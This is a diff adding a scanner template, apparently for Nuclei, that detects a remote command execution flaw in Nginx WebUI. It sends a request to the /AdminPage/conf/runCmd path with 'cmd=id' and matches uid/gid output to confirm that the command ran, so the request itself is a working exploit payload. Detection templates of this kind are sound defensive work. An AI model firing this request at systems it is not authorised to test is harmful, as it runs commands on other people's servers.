@@ -1,0 +1,29 @@
+id: poc-nginx-webui-rce
+
+info:
+  name: Nginx WebUI Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Detects remote command execution vulnerability in Nginx WebUI via specific paths.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/AdminPage/conf/runCmd?cmd=id"
+      - "{{BaseURL}}/AdminPage/about"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nginxWebUI"
+          - "confStr.jserror2 = \"nginx.conf"
+      - type: word
+        part: body
+        words:
+          - "运行失败"
+          - "<br>uid="
+          - "gid="
+        condition: and
